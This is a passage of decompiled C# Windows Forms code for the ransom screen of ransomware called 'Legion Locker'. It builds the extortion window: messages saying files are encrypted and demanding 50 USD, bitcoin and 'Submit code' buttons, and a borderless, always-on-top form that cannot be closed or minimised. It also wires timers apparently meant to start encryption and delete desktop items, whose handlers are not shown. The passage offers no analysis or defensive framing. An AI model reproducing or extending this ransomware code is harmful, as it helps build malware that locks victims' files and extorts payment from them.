		((Control)label6).set_Size(new Size(93, 16));
		((Control)label6).set_TabIndex(8);
		((Control)label6).set_Text("How do i pay?");
		((Control)button5).set_BackColor(Color.Yellow);
		((ButtonBase)button5).set_FlatStyle((FlatStyle)0);
		((Control)button5).set_Location(new Point(552, 361));
		((Control)button5).set_Name("button5");
		((Control)button5).set_Size(new Size(91, 23));
		((Control)button5).set_TabIndex(7);
		((Control)button5).set_Text("Submit code");
		((ButtonBase)button5).set_UseVisualStyleBackColor(false);
		((Control)button5).add_Click((EventHandler)button5_Click);
		((Control)textBox1).set_BackColor(Color.Black);
		((Control)textBox1).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)238));
		((Control)textBox1).set_ForeColor(Color.Lime);
		((Control)textBox1).set_Location(new Point(3, 361));
		((TextBoxBase)textBox1).set_Multiline(true);
		((Control)textBox1).set_Name("textBox1");
		((Control)textBox1).set_Size(new Size(543, 23));
		((Control)textBox1).set_TabIndex(6);
		((Control)label5).set_AutoSize(true);
		((Control)label5).set_BackColor(Color.Black);
		((Control)label5).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)238));
		((Control)label5).set_ForeColor(Color.Lime);
		((Control)label5).set_Location(new Point(145, 109));
		((Control)label5).set_Name("label5");
		((Control)label5).set_Size(new Size(378, 16));
		((Control)label5).set_TabIndex(5);
		((Control)label5).set_Text("Sure. If you want decrypt all your files, you need to pay 50 USD.");
		((Control)label4).set_AutoSize(true);
		((Control)label4).set_BackColor(Color.Black);
		((Control)label4).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)238));
		((Control)label4).set_ForeColor(Color.Lime);
		((Control)label4).set_Location(new Point(265, 84));
		((Control)label4).set_Name("label4");
		((Control)label4).set_Size(new Size(142, 16));
		((Control)label4).set_TabIndex(4);
		((Control)label4).set_Text("Can i recover my files?");
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_BackColor(Color.Black);
		((Control)label3).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)238));
		((Control)label3).set_ForeColor(Color.Lime);
		((Control)label3).set_Location(new Point(235, 29));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(197, 16));
		((Control)label3).set_TabIndex(3);
		((Control)label3).set_Text("What happend to my computer?");
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_BackColor(Color.Black);
		((Control)label2).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)238));
		((Control)label2).set_ForeColor(Color.Lime);
		((Control)label2).set_Location(new Point(12, 57));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(606, 16));
		((Control)label2).set_TabIndex(2);
		((Control)label2).set_Text("Your documents, photos, databases and other important files have been encrypted by Legion Locker!");
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_BackColor(Color.Black);
		((Control)label1).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)238));
		((Control)label1).set_ForeColor(Color.Lime);
		((Control)label1).set_Location(new Point(192, 4));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(273, 16));
		((Control)label1).set_TabIndex(1);
		((Control)label1).set_Text("Ooops! All your important files are encrypted!");
		pictureBox1.set_Image((Image)componentResourceManager.GetObject("pictureBox1.Image"));
		((Control)pictureBox1).set_Location(new Point(-31, 0));
		((Control)pictureBox1).set_Name("pictureBox1");
		((Control)pictureBox1).set_Size(new Size(201, 238));
		pictureBox1.set_TabIndex(2);
		pictureBox1.set_TabStop(false);
		pictureBox2.set_Image((Image)componentResourceManager.GetObject("pictureBox2.Image"));
		((Control)pictureBox2).set_Location(new Point(836, 0));
		((Control)pictureBox2).set_Name("pictureBox2");
		((Control)pictureBox2).set_Size(new Size(226, 238));
		pictureBox2.set_TabIndex(3);
		pictureBox2.set_TabStop(false);
		((Control)button2).set_BackColor(Color.Yellow);
		((ButtonBase)button2).set_FlatStyle((FlatStyle)0);
		((Control)button2).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)238));
		((Control)button2).set_Location(new Point(440, 472));
		((Control)button2).set_Name("button2");
		((Control)button2).set_Size(new Size(116, 23));
		((Control)button2).set_TabIndex(4);
		((Control)button2).set_Text("What is bitcoin?");
		((ButtonBase)button2).set_UseVisualStyleBackColor(false);
		((Control)button2).add_Click((EventHandler)button2_Click);
		((Control)button4).set_BackColor(Color.Yellow);
		((ButtonBase)button4).set_FlatStyle((FlatStyle)0);
		((Control)button4).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)238));
		((Control)button4).set_Location(new Point(706, 472));
		((Control)button4).set_Name("button4");
		((Control)button4).set_Size(new Size(134, 23));
		((Control)button4).set_TabIndex(6);
		((Control)button4).set_Text("Contact us");
		((ButtonBase)button4).set_UseVisualStyleBackColor(false);
		((Control)button4).add_Click((EventHandler)button4_Click);
		((Control)button6).set_BackColor(Color.Yellow);
		((ButtonBase)button6).set_FlatStyle((FlatStyle)0);
		((Control)button6).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)238));
		((Control)button6).set_Location(new Point(176, 472));
		((Control)button6).set_Name("button6");
		((Control)button6).set_Size(new Size(75, 23));
		((Control)button6).set_TabIndex(7);
		((Control)button6).set_Text("Rules");
		((ButtonBase)button6).set_UseVisualStyleBackColor(false);
		((Control)button6).add_Click((EventHandler)button6_Click);
		tmr_start_enc.set_Enabled(true);
		tmr_start_enc.set_Interval(3000);
		tmr_start_enc.add_Tick((EventHandler)tmr_start_enc_Tick);
		tmr_del_desktop.set_Enabled(true);
		tmr_del_desktop.add_Tick((EventHandler)tmr_del_desktop_Tick);
		tmr_if.set_Enabled(true);
		tmr_if.set_Interval(10);
		tmr_if.add_Tick((EventHandler)tmr_if_Tick);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_AutoSizeMode((AutoSizeMode)0);
		((Control)this).set_BackColor(Color.Black);
		((Form)this).set_ClientSize(new Size(1030, 522));
		((Form)this).set_ControlBox(false);
		((Control)this).get_Controls().Add((Control)(object)button6);
		((Control)this).get_Controls().Add((Control)(object)button4);
		((Control)this).get_Controls().Add((Control)(object)button2);
		((Control)this).get_Controls().Add((Control)(object)panel1);
		((Control)this).get_Controls().Add((Control)(object)pictureBox2);
		((Control)this).get_Controls().Add((Control)(object)pictureBox1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_TopMost(true);
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form1_FormClosing));
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)panel1).ResumeLayout(false);
		((Control)panel1).PerformLayout();
		((ISupportInitialize)pictureBox1).EndInit();
		((ISupportInitialize)pictureBox2).EndInit();
		((Control)this).ResumeLayout(false);
	}
}
